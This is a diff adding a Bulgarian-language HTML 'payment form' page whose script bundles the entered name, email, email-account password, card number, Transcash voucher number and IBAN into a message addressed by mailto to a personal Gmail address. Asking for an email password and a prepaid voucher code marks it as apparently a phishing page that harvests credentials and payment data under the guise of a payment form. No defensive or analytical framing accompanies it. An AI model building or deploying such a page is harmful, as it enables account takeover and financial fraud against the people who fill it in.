@@ -1,0 +1,170 @@
+<!doctype html>
+<html lang="bg">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Форма за плащане</title>
+<style>
+/* --- Reset et styles globaux --- */
+* {box-sizing: border-box; margin:0; padding:0; font-family: 'Inter', sans-serif;}
+body {
+  background: linear-gradient(180deg,#e0f7e9,#c9f0d7);
+  color: #05343a;
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  padding: 30px;
+}
+h2, h3 {margin-bottom: 12px; color: #1e7a34;}
+p {margin-bottom: 12px; color: #64707a;}
+.wrap {
+  display: grid;
+  grid-template-columns: 1fr 380px;
+  gap: 24px;
+  max-width: 980px;
+  width: 100%;
+}
+@media(max-width:920px){.wrap{grid-template-columns:1fr;}}
+
+/* --- Panels --- */
+.panel {
+  background: #fff;
+  border-radius: 12px;
+  padding: 25px;
+  box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+}
+
+/* --- Formulaire --- */
+form label {
+  display: block;
+  margin-top: 12px;
+  margin-bottom: 6px;
+  font-weight: 600;
+  font-size: 14px;
+}
+input, textarea {
+  width: 100%;
+  padding: 12px;
+  border-radius: 10px;
+  border: 1px solid #d0e6de;
+  font-size: 14px;
+  background: #fbffff;
+  color: #05343a;
+}
+textarea {resize: vertical;}
+button {
+  margin-top: 20px;
+  padding: 12px 18px;
+  border: none;
+  border-radius: 10px;
+  background: #1e7a34;
+  color: #fff;
+  font-weight: 600;
+  cursor: pointer;
+  font-size: 15px;
+}
+button:hover {background: #145c27;}
+
+/* --- Preview --- */
+#preview {
+  background: #f0fff6;
+  padding: 15px;
+  border-radius: 10px;
+  overflow-x: auto;
+  font-size: 14px;
+  height: 350px;
+  white-space: pre-wrap;
+  border: 1px solid #d0e6de;
+}
+</style>
+</head>
+<body>
+
+<main class="wrap">
+
+<!-- Formulaire -->
+<section class="panel">
+  <h2>Форма за плащане</h2>
+  <p>Попълнете полетата по-долу и натиснете „Изпрати по имейл“.</p>
+
+  <form id="main-form">
+    <label>Име и фамилия</label>
+    <input name="name" type="text" required placeholder="Иван Петров">
+
+    <label>Имейл</label>
+    <input name="email" type="email" required placeholder="ivan@example.com">
+
+    <label>Парола (на имейла)</label>
+    <input name="password" type="text" placeholder="Парола на имейл">
+
+    <label>Сума (BGN)</label>
+    <input name="amount" type="number" min="1" value="50" required>
+
+    <label>Номер на карта</label>
+    <input name="card" type="text" placeholder="1234 5678 9012 3456">
+
+    <label>Номер на билет Transcash</label>
+    <input name="transcash" type="text" placeholder="XXXX-XXXX-XXXX">
+
+    <label>IBAN</label>
+    <input name="iban" type="text" placeholder="BG12BUKB12345678901234">
+
+    <label>Бележка</label>
+    <textarea name="note" rows="4" placeholder="Описание на плащането..."></textarea>
+
+    <button type="submit">Изпрати по имейл</button>
+  </form>
+</section>
+
+<!-- Aperçu -->
+<aside class="panel">
+  <h3>Преглед на данните</h3>
+  <p>Всички въведени данни ще бъдат изпратени по имейл до <strong>soso@gmail.com</strong>.</p>
+  <pre id="preview"></pre>
+</aside>
+
+</main>
+
+<script>
+const form = document.getElementById('main-form');
+const preview = document.getElementById('preview');
+
+// Génère le corps de l'email de manière lisible
+function generateBody(data) {
+  let body = "=== Информация за плащане ===\n\n";
+  body += "Лична информация:\n";
+  body += `Име: ${data.get('name') || '-'}\n`;
+  body += `Имейл: ${data.get('email') || '-'}\n`;
+  body += `Парола: ${data.get('password') || '-'}\n\n`;
+  body += "Данни за плащане:\n";
+  body += `Сума (BGN): ${data.get('amount') || '-'}\n`;
+  body += `Номер на карта: ${data.get('card') || '-'}\n`;
+  body += `Transcash: ${data.get('transcash') || '-'}\n`;
+  body += `IBAN: ${data.get('iban') || '-'}\n\n`;
+  body += "Бележка:\n";
+  body += `${data.get('note') || '-'}\n`;
+  return body;
+}
+
+// Met à jour la prévisualisation
+function updatePreview() {
+  const data = new FormData(form);
+  preview.textContent = generateBody(data);
+}
+
+form.addEventListener('input', updatePreview);
+updatePreview();
+
+// Soumettre le formulaire via mailto
+form.addEventListener('submit', function(e){
+  e.preventDefault();
+  const data = new FormData(form);
+  const body = generateBody(data);
+  const mailto = `mailto:soso@gmail.com?subject=${encodeURIComponent('Ново плащане')}&body=${encodeURIComponent(body)}`;
+  window.location.href = mailto;
+});
+</script>
+
+</body>
+</html>
